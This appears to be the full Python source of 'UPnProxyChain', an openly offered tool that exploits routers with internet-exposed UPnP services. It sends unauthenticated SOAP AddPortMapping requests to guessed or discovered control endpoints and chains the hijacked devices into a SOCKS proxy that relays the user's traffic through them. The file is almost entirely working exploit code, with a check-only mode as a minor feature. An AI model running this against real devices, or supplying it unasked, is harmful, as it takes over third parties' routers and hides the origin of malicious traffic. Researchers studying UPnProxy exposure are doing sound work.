#!/usr/bin/python3
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Created By    : Valtteri Lehtinen <valtteri@shufflingbytes.com>
# Created Date  : 30/05/2022
# Link          : https://shufflingbytes.com/posts/upnproxychain-a-tool-to-exploit-devices-vulnerable-to-upnproxy/
#----------------------------------------------------------------------------


"""
  _   _ ___      ___                   ___ _         _
 | | | | _ \_ _ | _ \_ _ _____ ___  _ / __| |_  __ _(_)_ _
 | |_| |  _/ ' \|  _/ '_/ _ \ \ / || | (__| ' \/ _` | | ' \
  \___/|_| |_||_|_| |_| \___/_\_\_, |\___|_||_\__,_|_|_||_|
                                 |__/

  Author: Valtteri Lehtinen <valtteri@shufflingbytes.com>
  Writeup: https://shufflingbytes.com/posts/upnproxychain-a-tool-to-exploit-devices-vulnerable-to-upnproxy/


usage: upnproxychain.py [-h] [-p PORT] [-l LISTENADDRESS] [-c] [-v] host [host ...]

A SOCKS proxy server that forwards traffic through a chain of exposed WANIP- or WANPPPConnection UPnP services

positional arguments:
  host                  hosts to use as proxy chain links in order

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  port for SOCKS proxy to listen on
  -l LISTENADDRESS, --listenaddress LISTENADDRESS
                        address for SOCKS proxy to listen on
  -c, --check           only check for UPnProxy vulnerability
  -v, --verbose         increase output verbosity
"""


import socket
import re
import urllib
from enum import Enum
import threading
import select
import random
import argparse
import signal
import logging
from urllib import request


def main():
    """main"""

    print_banner()

    parser = argparse.ArgumentParser(description=\
        'A SOCKS proxy server that forwards traffic through a chain of exposed \
        WANIP- or WANPPPConnection UPnP services')
    parser.add_argument("host", nargs='+', help="hosts to use as proxy chain links in order")
    parser.add_argument("-p", "--port", type=int, default=1080, \
        help="port for SOCKS proxy to listen on")
    parser.add_argument("-l", "--listenaddress", type=str, default="127.0.0.1", \
        help="address for SOCKS proxy to listen on")
    parser.add_argument("-c", "--check", help="only check for UPnProxy vulnerability",
                    action="store_true")
    parser.add_argument("-v", "--verbose", help="increase output verbosity",
                    action="store_true")
    args = parser.parse_args()

    # configure logging
    record_format = "%(asctime)s - %(levelname)s - %(message)s"
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG, format=record_format, datefmt='%Y-%m-%d %H:%M:%S')
    else:
        logging.basicConfig(level=logging.INFO, format=record_format, datefmt='%Y-%m-%d %H:%M:%S')

    # raise keyboardinterrupt exception on ctrl+c
    signal.signal(signal.SIGINT, signal.default_int_handler)

    logging.info('Building connection chain...')

    try:
        connection_chain = ConnectionChain(args.host)

        logging.info('Verifying chain functionality...')
        connection_chain.verify_functionality()
        logging.info("All hosts on chain are VULNERABLE!")

        if args.check:
            connection_chain.destroy()
            return

        logging.info('Starting SOCKS proxy server...')
        proxy = Proxy(connection_chain, args.listenaddress, args.port)
        proxy.run()
    except ConnectionChain.ChainBuildException as exception:
        logging.critical('Failed adding link to chain: %s', exception)
    except KeyboardInterrupt:
        logging.warning("Please wait, cleaning up the connection chain...")
        connection_chain.destroy()
    except Exception as exception:
        logging.critical('Unexpected exception: %s', exception)
        connection_chain.destroy()

class Protocol(Enum):
    """Procotol enum"""
    TCP = 'TCP'
    UDP = 'UDP'

class LinkType(Enum):
    """Link type enum"""
    WANIP = 'WANIPConnection'
    WANPPP = 'WANPPPConnection'

class ConnectionChain:
    """Connection chain through UPNP hosts

    Attributes:
        head (ChainStart): first link in the chain.
        connections (list(Connection)): list of connections created through the chain.
    """

    # construct the chain (add control mappings)
    def __init__(self, list_of_ips):
        """Create ConnectionChain through list_of_ips.
        The links in chain are created in order; the first IP in list becomes the first link

        Args:
            list_of_ips (list(str)): list of IPs to connect through.

        Returns:
            int, string: port number and ip at which the destination can be reached through.
        """

        try:
            self.connections = [] # tracked connections

            head_ip = list_of_ips.pop(0)

            # add temporarily a chain head with only IP
            self.head = self.ChainStart(head_ip, None, None, None)

            # find required values and replace current with full info
            ctrl_port, upnp_path = self.__get_ctrl_port_and_path(1900, head_ip)
            ctrl_path, link_type = self.__get_ctrl_path_and_type(ctrl_port, upnp_path, head_ip)
            self.head = self.ChainStart(head_ip, ctrl_port, ctrl_path, link_type)

            # add rest through the current chain
            for hop in list_of_ips:
                self.__add_link(hop)
        except Exception as exception: 
            self.destroy()
            raise self.ChainBuildException(exception)



    def get_connection_endpoint(self, dst_ip, dst_port, protocol=Protocol.TCP):
        """Make a new connection to destination through the chain.
        If connection to the destination already exists, reuse that one.

        Args:
            dst_ip (str): destination ip.
            dst_port (int): destination port.

        Keyword arguments:
            protocol -- protocol of the mapping (default Protocol.TCP)

        Returns:
            int, string: port number and ip at which the destination can be reached through.
        """

        try:
            # check if such connection already exists
            for connection in self.connections:
                if dst_ip == connection.dst_ip \
                and dst_port == connection.dst_port \
                and protocol == connection.protocol:
                    logging.debug('Reusing existing connection')
                    return self.head.ip_addr, connection.src_port

            # create new connection through the chain
            logging.debug('Creating a new connection')
            connection = self.__add_connection(dst_ip, dst_port, protocol)
            return self.head.ip_addr, connection.src_port
        except Exception as exception:
            raise self.ConnectionGettingException(exception)

    def destroy(self):
        """Destroy the whole chain by removing all connections from links"""

        # remove connection in reverse order (as otherwise not all can be removed)
        reverse_connections = list(self.connections)
        reverse_connections.reverse()

        for connection in reverse_connections:
            self.__del_connection(connection)

    def print_all_mappings(self):
        """Print all mappings in each link of the chain.
        Includes mappings created by others"""
        link = self.head
        while link is not None:
            print(f"### Link: {link.ip_addr} ###")
            self.__print_mappings(link)
            link = link.next

    def print_all_connections(self):
        """Print all connections created through the chain."""
        for connection in self.connections:
            print(f"{self.head.ip_addr}:{connection.src_port} -> "\
                + f"{connection.dst_ip}:{connection.dst_port} ({connection.protocol.value})")

    def verify_functionality(self):
        """Test chain functionality by making GET request to example.com"""

        try:
            test_host = 'example.com'
            test_host_ip = socket.gethostbyname(test_host)

            connection = self.__add_connection(test_host_ip, 80)

            url = f"http://{self.head.ip_addr}:{connection.src_port}"

            req = request.Request(url, method="GET")
            req.add_header('Host', test_host)
            req.add_header('Connection', 'close')

            logging.debug("Testing connection to example.com...")

            res = request.urlopen(req, timeout=10)
            assert res.status == 200
        except Exception as exception:
            logging.critical('Connection chain unfunctional (connection to example.com failed) - %s', \
                exception)
            self.destroy()
            raise self.ChainBuildException(exception)

        logging.debug("Connection chain is functional")

    def __add_link(self, ip_addr):

        logging.debug('Adding new link to chain (%s)', ip_addr)

        # add UDP mapping to get control port and upnp path
        udp_connection = self.__add_connection(ip_addr, 1900, Protocol.UDP)
        ctrl_port, upnp_path = self.__get_ctrl_port_and_path(udp_connection.src_port, ip_addr)
        self.__del_connection(udp_connection)

        # add TCP mapping to the control port to get the control path
        ctrl_connection = self.__add_connection(ip_addr, ctrl_port, Protocol.TCP)
        ctrl_path, link_type = self.__get_ctrl_path_and_type(ctrl_connection.src_port, \
            upnp_path, ip_addr)

        # create a new link
        new_link = self.Link(ip_addr, ctrl_port, ctrl_path, link_type)

        # append the link to chain
        link = self.head
        while link is not None:
            if link.next is None:
                link.next = new_link
                break
            else:
                link = link.next


    # add connection to host through the chain
    # used when connection is to be made through the chain
    # returns the connection
    def __add_connection(self, dst_ip, dst_port, protocol=Protocol.TCP):

        logging.debug('Adding connection to %s:%d', dst_ip, dst_port)

        rand_port = random.randint(10000, 65535)
        link = self.head

        while link is not None:

            if link.next is not None:
                # use control port mappings on head to
                self.__add_mapping(link, rand_port, link.next.ip_addr, rand_port, protocol)
            else:
                # last link in chain, forward to destination
                self.__add_mapping(link, rand_port, dst_ip, dst_port, protocol)

            link = link.next

        # add connection to recordkeeping
        connection = self.Connection(rand_port, dst_ip, dst_port, protocol)
        self.connections.append(connection)

        logging.debug('Connection added successfully')
        return connection

    # delete connection going through the chain
    # used when connection is to be made through the chain
    def __del_connection(self, connection):

        logging.debug('Deleting connection to %s:%d', connection.dst_ip, connection.dst_port)

        src_port = connection.src_port
        protocol = connection.protocol
        link = self.head

        # delete all mappings related to this connection
        while link is not None:
            self.__del_mapping(link, src_port, protocol)
            link = link.next

        self.connections.remove(connection)

    # add mapping to single link
    def __add_mapping(self, link, src_port, dst_ip, dst_port, protocol):
        logging.debug('Adding %s mapping on link %s (port %d)', \
            protocol.value, link.ip_addr, src_port)
        self.head.add_mapping(link, src_port, dst_ip, dst_port, protocol)

    # delete mapping in a single link
    def __del_mapping(self, link, src_port, protocol):
        logging.debug('Deleting %s mapping on link %s (port %d)', \
            protocol.value, link.ip_addr, src_port)
        self.head.delete_mapping(link, src_port, protocol)

    # print all mappings in a single link
    def __print_mappings(self, link):
        self.head.print_mappings(link)

    # get ctrl port and upnp path of link
    # through port on chain head
    def __get_ctrl_port_and_path(self, port, dst_ip):

        logging.debug('Getting ctrl port and path (%s)', dst_ip)

        # get upnp document url
        message = b"""M-SEARCH * HTTP/1.1\r\n
        Host: 239.255.255.250:1900\r\n
        ST: upnp:rootdevice\r\n
        Man: "ssdp:discover"\r\n
        MX: 3\r\n\r\n"""

        connection_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        connection_socket.settimeout(5)
        connection_socket.sendto(message, (self.head.ip_addr, port))

        # try SSDP discovery 3 times
        for i in range(3):
            try:
                data = connection_socket.recv(4096)
                connection_socket.close()

                match = re.search(\
                    r"location:[^:]*:[^:]*:([^/]*)/([^\r\n]*)", \
                    data.decode('utf8'), \
                    re.IGNORECASE)

                upnp_port = int(match.group(1))
                upnp_path = match.group(2)

                return upnp_port, upnp_path
            except socket.timeout:
                logging.debug("No response to SSDP discover from host %s on try %d...", dst_ip, i)

        # resort to sniping
        logging.warning("No response to SSDP discover from host %s. Trying sniping...", dst_ip)
        return self.__snipe_ctrl_port_and_path(dst_ip)

    # try guessing ctrl port and path
    def __snipe_ctrl_port_and_path(self, dst_ip):

        top_ctrl_port_path_combinations = [
            (52881, "simplecfg.xml"),
            (65535, "rootDesc.xml"),
            (5000, "ssdp/desc-DSM-eth0.xml"),
            (80, "UPnP/IGD.xml"),
            (2048, "etc/linuxigd/gatedesc.xml"),
            (49152, "wps_device.xml"),
            (1900, "rootDesc.xml"),
            (52869, "picsdesc.xml"),
            (8080, "upnp"),
            (65530, "rootDesc.xml"),
            (5000, "ssdp/desc-DSM-eth1.xml"),
            (5500, "rootDesc.xml"),
            (12040, "rootDesc.xml"),
            (65530, "root.sxml"),
            (49125, "gatedesc.xml"),
            (5000, "ssdp/desc-DSM-ovs_eth0.xml"),
            (5555, "rootDesc.xml"),
            (5200, "Printer.xml"),
            (5000, "rootDesc.xml"),
            (80, "bmlinks/ddf.xml")
        ]

        # try accessing each combination directly
        for combination in top_ctrl_port_path_combinations:

            port, path = combination
            logging.debug('Sniping %s:%d/%s for ctrl url and path', dst_ip, port, path)

            # if sniping chain head, cannot add connection
            if self.head.ip_addr == dst_ip:
                connection = self.Connection(port, dst_ip, port)
            else:
                connection = self.__add_connection(dst_ip, port)

            url = f"http://{self.head.ip_addr}:{connection.src_port}/{path}"

            # get WANIPConnection ctrl url
            try:
                http_connection = request.urlopen(url, timeout=5)
            except Exception as exception:
                logging.debug('Sniping failed: %s', exception)

                # if head, connection must not be deleted
                if self.head.ip_addr != dst_ip:
                    self.__del_connection(connection)
                continue

            response = http_connection.read().decode('utf8')

            # if head, connection must not be deleted
            if self.head.ip_addr != dst_ip:
                self.__del_connection(connection)

            wanip_match = re.search(\
                r"WANIPConnection(?:(?!controlURL).)*<controlURL>/([^<]*)</controlURL>", \
                response, \
                re.DOTALL)
            wanppp_match = re.search(\
                r"WANPPPConnection(?:(?!controlURL).)*<controlURL>/([^<]*)</controlURL>", \
                response, \
                re.DOTALL)
            if wanip_match or wanppp_match:
                logging.debug('Sniping succeeded')
                return port, path

        raise ValueError(f"Could not find UPnP control port for host {dst_ip}")

    # get ctrl path and type of link
    # through port on chain head
    def __get_ctrl_path_and_type(self, port, upnp_path, dst_ip):

        logging.debug('Getting ctrl path and type (%s)', dst_ip)

        upnp_url = f"http://{self.head.ip_addr}:{port}/{upnp_path}"

        # get WANIPConnection ctrl url
        http_connection = request.urlopen(upnp_url, timeout=5)
        response = http_connection.read().decode('utf8')

        # search for WANIPConnection and WANPPPConnection ctrl urls
        link_type = LinkType.WANIP
        match = re.search(\
            r"WANIPConnection(?:(?!controlURL).)*<controlURL>/([^<]*)</controlURL>", \
            response, \
            re.DOTALL)
        if not match:
            link_type = LinkType.WANPPP
            match = re.search(\
            r"WANPPPConnection(?:(?!controlURL).)*<controlURL>/([^<]*)</controlURL>", \
            response, \
            re.DOTALL)
        if not match:
            logging.critical('No WANIPConnection or WANPPPConnection found on host %s', dst_ip)
            raise ValueError(f"No WANIPConnection or WANPPPConnection found on host {dst_ip}")

        ctrl_path = match.group(1)

        return ctrl_path, link_type


    # link in the proxy chain
    class Link:
        """Link in the ConnectionChain

        Attributes:
            ip_addr (str): IP address of link.
            ctrl_port (int): port on ChainStart that forward to the real control port of this link.
            ctrl_path (str): UPNP ctrl path.
            next (Link): next link in chain.
            link_type (LinkType): type of service used (WANIP or WANPPP)
        """

        def __init__(self, ip_addr, ctrl_port, ctrl_path, link_type):
            self.ip_addr = ip_addr
            self.ctrl_port = ctrl_port
            self.ctrl_path = ctrl_path
            self.next = None
            self.link_type = link_type

    # special case of a link in the chain
    # (the first link in chain)
    class ChainStart(Link):
        """First link in the ConnectionChain

        Attributes:
            ip_addr (str): IP address of link.
            ctrl_port (int): UPNP ctrl port.
            ctrl_path (str): UPNP ctrl path.
            next (Link): next link in chain.
        """

        def add_mapping(self, link, src_port, dst_ip, dst_port, \
            protocol=Protocol.TCP, lease_duration=600, description="UPnProxyChain") -> None:
            """Add a new port mapping to link.

            Args:
                link (Link): link to add mapping to.
                src_port (int): source port.
                dst_ip (str): destination ip.
                dst_port (int): destination port.

            Keyword arguments:
                protocol -- protocol of the mapping (default Protocol.TCP)
                lease_duration -- duration for the mapping in seconds (default 600)
                description -- description for the mapping (default 'UPnProxyChain')
            """

            ctrl_url = f"http://{self.ip_addr}:{link.ctrl_port}/{link.ctrl_path}"

            message = f"""<?xml version="1.0"?>
            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <s:Body>
                <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:{link.link_type.value}:1">
                    <NewRemoteHost></NewRemoteHost>
                    <NewExternalPort>{src_port}</NewExternalPort>
                    <NewProtocol>{protocol.value}</NewProtocol>
                    <NewInternalPort>{dst_port}</NewInternalPort>
                    <NewInternalClient>{dst_ip}</NewInternalClient>
                    <NewEnabled>1</NewEnabled>
                    <NewPortMappingDescription>{description}</NewPortMappingDescription>
                    <NewLeaseDuration>{lease_duration}</NewLeaseDuration>
                </u:AddPortMapping>
            </s:Body>
            </s:Envelope>
            """
            self.__send_soap_message(ctrl_url, \
                'urn:schemas-upnp-org:service:{link.link_type.value}:1#AddPortMapping', \
                str.encode(message))

        def delete_mapping(self, link, src_port, protocol=Protocol.TCP) -> None:
            """Delete a port mapping on link.

            Args:
                ctrl_url (str): UPNP WANIPConnection or WANPPPConnection uri endpoint to use.
                src_port (int): source port of the mapping.

            Keyword arguments:
                protocol -- protocol of the mapping (default Protocol.TCP)
            """

            ctrl_url = f"http://{self.ip_addr}:{link.ctrl_port}/{link.ctrl_path}"

            message = f"""<?xml version="1.0"?>
            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <s:Body>
                <u:DeletePortMapping xmlns:u="urn:schemas-upnp-org:service:{link.link_type.value}:1">
                    <NewRemoteHost></NewRemoteHost>
                    <NewExternalPort>{src_port}</NewExternalPort>
                    <NewProtocol>{protocol.value}</NewProtocol>
                    </u:DeletePortMapping>
                </s:Body>
            </s:Envelope>
            """
            self.__send_soap_message(ctrl_url, \
                'urn:schemas-upnp-org:service:{link.link_type.value}:1#DeletePortMapping', \
                str.encode(message))

        def print_mappings(self, link) -> None:
            """Print all port mappings on a link

            Args:
                ctrl_url (str): UPNP WANIPConnection or WANPPPConnection uri endpoint to use.
            """

            ctrl_url = f"http://{self.ip_addr}:{link.ctrl_port}/{link.ctrl_path}"

            for i in range(1, 1000):

                message = f"""<?xml version="1.0"?>
                <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <s:Body>
                    <u:GetGenericPortMappingEntry xmlns:u="urn:schemas-upnp-org:service:{link.link_type.value}:1">
                        <NewPortMappingIndex>{i}</NewPortMappingIndex>
                    </u:GetGenericPortMappingEntry>
                </s:Body>
                </s:Envelope>
                """

                try:
                    http_connection = self.__send_soap_message(ctrl_url, \
                        'urn:schemas-upnp-org:service:{link.link_type.value}:1#GetGenericPortMappingEntry', \
                        str.encode(message))
                    # probably went past last mapping
                    if http_connection.status != 200:
                        break
                except urllib.error.HTTPError:
                    break

                body = http_connection.read().decode('utf8')

                new_external_port = re.search(\
                    r"<NewExternalPort>([^<]*)<\/NewExternalPort>", \
                    body).group(1)
                new_protocol = re.search(\
                    r"<NewProtocol>([^<]*)<\/NewProtocol>", \
                    body).group(1)
                new_internal_port = re.search(\
                    r"<NewInternalPort>([^<]*)<\/NewInternalPort>", \
                    body).group(1)
                new_internal_client = re.search(\
                    r"<NewInternalClient>([^<]*)<\/NewInternalClient>", \
                    body).group(1)
                new_enabled = re.search(\
                    r"<NewEnabled>([^<]*)<\/NewEnabled>", \
                    body).group(1)
                new_port_mapping_description = re.search(\
                    r"<NewPortMappingDescription>([^<]*)<\/NewPortMappingDescription>", \
                    body).group(1)
                new_lease_duration = re.search(\
                    r"<NewLeaseDuration>([^<]*)<\/NewLeaseDuration>", \
                        body).group(1)

                print(f"Mapping {i}: ({new_protocol}) port {new_external_port} -> "\
                    + f"{new_internal_client}:{new_internal_port} || enabled: {new_enabled}, "\
                    + f"for {new_lease_duration} seconds || \"{new_port_mapping_description}\"")


        def __send_soap_message(self, ctrl_url, soap_action, message):
            req = request.Request(ctrl_url, method="POST")
            req.add_header('Content-Type', 'text/xml; charset=utf-8')
            req.add_header('Connection', 'close')
            req.add_header('SOAPAction', soap_action)

            try:
                return request.urlopen(req, data=message, timeout=5)
            except Exception as exception:
                raise exception

    # class to represent connection through the proxy chain
    class Connection:
        """A single connection through the connection chain"""

        def __init__(self, src_port, dst_ip, dst_port, protocol=Protocol.TCP):
            self.src_port = src_port
            self.dst_ip = dst_ip
            self.dst_port = dst_port
            self.protocol = protocol

    class ChainBuildException(Exception):
        """Exception in chain build"""

    class ConnectionGettingException(Exception):
        """Exception in adding connection"""

class Proxy:
    """SOCKS proxy server

    Attributes:
        listen_address (str): IP address to listen on.
        port (int): port to listen on.
        connection_chain (ConnectionChain): connection chain to connect through.
    """

    SOCKS5_VERSION = b'\x05'
    SOCKS5_METHOD_NOAUTH = b'\x00'
    SOCKS5_METHOD_NOACCEPTABLEMETHODS = b'\xFF'
    SOCKS5_REP_SUCCESS = b'\x00'
    SOCKS5_REP_UNSUPPORTEDADDRTYPE = b'\x08'
    SOCKS5_REP_UNSUPPORTEDCOMMAND = b'\x07'
    SOCKS5_REP_GENERALERROR = b'\x01'
    RSV = b'\x00'
    ATYP_IPV4 = b'\x01'
    SOCKS4_VERSION = b'\x04'
    SOCKS4_REQ_CONNECT = b'\x01'
    SOCKS4_VERSION_REPLY = b'\x00'
    SOCKS4_REP_REQGRANTED = b'\x5a'
    SOCKS4_REP_REJECTFAIL = b'\x9b'
    SOCKS_PADDING = b'\x00\x00\x00\x00\x00\x00'

    def __init__(self, connection_chain, listen_address="127.0.0.1", port=1080):
        """Create a new SOCKS proxy server.

        Args:
            connection_chain (ConnectionChain): connection chain to connect through.

        Keyword arguments:
            listen_address -- IP address to listen on (default '127.0.0.1')
            port -- port to listen on (default 1080)
        """
        self.listen_address = listen_address
        self.port = port
        self.connection_chain = connection_chain


    def run(self) -> None:
        """Start the proxy server"""

        listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_socket.bind((self.listen_address, self.port))
        listen_socket.listen()

        logging.info('Socks proxy server is running on %s:%d', self.listen_address,self.port)

        while True:
            conn, addr = listen_socket.accept()
            logging.info('New SOCKS connection from %s', addr)
            thread = threading.Thread(target=self.__handle_client, args=(conn,))
            thread.start()

    def __handle_client(self, connection):

        # choose version
        version = connection.recv(1)
        if version == self.SOCKS5_VERSION:
            self.__handle_socks5_client(connection)
        elif version == self.SOCKS4_VERSION:
            self.__handle_socks4_client(connection)
        else:
            connection.close()
            return

    def __handle_socks4_client(self, connection):

        socks4_cd = connection.recv(1)
        dst_port = int.from_bytes(connection.recv(2), 'big', signed=False)
        dst_ip = connection.recv(4)
        rest = connection.recv(1024)

        if re.match(b'\x00\x00\x00[^\x00]', dst_ip):
            # SOCKS4A request (client wants us to resolve hostname)
            # hostname is in rest, after USERID, terminated by null byte
            hostname = re.match(b'[^\x00]*\x00([^\x00]*)\x00', rest).group(1)
            try:
                address = socket.gethostbyname(hostname)
            except socket.gaierror:
                logging.error('Invalid hostname: %s', hostname)
                connection.close()
                return
        else:
            address = socket.inet_ntoa(dst_ip)

        if socks4_cd == self.SOCKS4_REQ_CONNECT:  # CONNECT
            try:
                remote = self.__connect(address, dst_port)
            except Exception as exception:
                logging.error('Cannot connect to %s:%d - %s', address, dst_port, exception)
                connection.sendall(self.SOCKS4_VERSION_REPLY + \
                    self.SOCKS4_REP_REJECTFAIL + \
                    self.SOCKS_PADDING)
                connection.close()
                return
        else:
            logging.error("Only CONNECT request allowed")
            connection.sendall(self.SOCKS4_VERSION_REPLY + \
                self.SOCKS4_REP_REJECTFAIL + \
                self.SOCKS_PADDING)
            connection.close()
            return

        # communicate back success
        connection.sendall(self.SOCKS4_VERSION_REPLY + \
            self.SOCKS4_REP_REQGRANTED + \
            self.SOCKS_PADDING)

        # establish data exchange
        self.__exchange_loop(connection, remote)

        connection.close()

    def __handle_socks5_client(self, connection):

        # greeting header
        # read and unpack 2 bytes from a client
        nmethods = int.from_bytes(connection.recv(1), 'big')

        # get available methods [0, 1, 2]
        methods = self.__get_available_methods(nmethods, connection)

        # accept only USERNAME/PASSWORD auth
        if self.SOCKS5_METHOD_NOAUTH not in set(methods):
            # close connection
            connection.sendall(self.SOCKS5_VERSION + self.SOCKS5_METHOD_NOACCEPTABLEMETHODS)
            connection.close()
            return

        # select noauth
        connection.sendall(self.SOCKS5_VERSION + self.SOCKS5_METHOD_NOAUTH)

        # receive request
        _vesion, cmd, _, address_type = connection.recv(4)

        if address_type == 1:  # IPv4
            address = socket.inet_ntoa(connection.recv(4))
        elif address_type == 3:  # Domain name
            domain_length = connection.recv(1)[0]
            hostname = connection.recv(domain_length)
            try:
                address = socket.gethostbyname(hostname)
            except socket.gaierror:
                logging.error('Invalid hostname: %s', hostname)
                connection.close()
                return
        else:
            logging.error("Only IPv4 addresses and domain names allowed as destination")
            connection.sendall(self.SOCKS5_VERSION + \
                self.SOCKS5_REP_UNSUPPORTEDADDRTYPE + \
                self.RSV + \
                self.ATYP_IPV4 + \
                self.SOCKS_PADDING)
            connection.close()
            return

        # convert bytes to unsigned short array
        port = int.from_bytes(connection.recv(2), 'big', signed=False)

        if cmd == 1:  # CONNECT
            try:
                remote = self.__connect(address, port)
            except Exception as exception:
                logging.error('Cannot connect to %s:%d - %s', address, port, exception)
                connection.sendall(self.SOCKS5_VERSION + \
                    self.SOCKS5_REP_GENERALERROR + \
                    self.RSV + \
                    self.ATYP_IPV4 + \
                    self.SOCKS_PADDING)
                connection.close()
                return
        else:
            logging.error("Only CONNECT request allowed")
            connection.sendall(self.SOCKS5_VERSION + \
                self.SOCKS5_REP_UNSUPPORTEDCOMMAND + \
                self.RSV + \
                self.ATYP_IPV4 + \
                self.SOCKS_PADDING)
            connection.close()

        bind_address = remote.getsockname()
        port = bind_address[1]

        connection.sendall(self.SOCKS5_VERSION + \
            self.SOCKS5_REP_SUCCESS + \
            self.RSV + \
            self.ATYP_IPV4 + \
            socket.inet_aton(bind_address[0]) + port.to_bytes(2, 'big'))

        # establish data exchange
        self.__exchange_loop(connection, remote)

        connection.close()


    def __exchange_loop(self, client, remote):
        while True:
            # wait until client or remote is available for read
            rlist, _wlist, _xlist = select.select([client, remote], [], [])

            if client in rlist:
                data = client.recv(4096)
                if remote.send(data) <= 0:
                    break

            if remote in rlist:
                data = remote.recv(4096)
                if client.send(data) <= 0:
                    break

    def __get_available_methods(self, nmethods, connection):
        methods = []
        for _i in range(nmethods):
            methods.append(connection.recv(1))
        return methods

    def __connect(self, address, port):
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # create connetion through chain and use its entrance to reach the destination
        first_link_ip, first_link_port = \
            self.connection_chain.get_connection_endpoint(address, port)

        logging.debug('Received endpoint %s:%d from connection chain', \
            first_link_ip, first_link_port)

        remote.connect((first_link_ip, first_link_port))
        logging.info('Connected through chain to %s:%d', address, port)
        return remote

def print_banner():
    """Print banner"""

    banner = """\
  _   _ ___      ___                   ___ _         _      
 | | | | _ \_ _ | _ \_ _ _____ ___  _ / __| |_  __ _(_)_ _  
 | |_| |  _/ ' \|  _/ '_/ _ \ \ / || | (__| ' \/ _` | | ' \ 
  \___/|_| |_||_|_| |_| \___/_\_\\_, |\___|_||_\__,_|_|_||_|
                                 |__/                       

  Author: Valtteri Lehtinen <valtteri@shufflingbytes.com>
  Writeup: https://shufflingbytes.com/posts/upnproxychain-a-tool-to-exploit-devices-vulnerable-to-upnproxy/
\n"""
    print(banner)


if __name__ == "__main__":
    main()
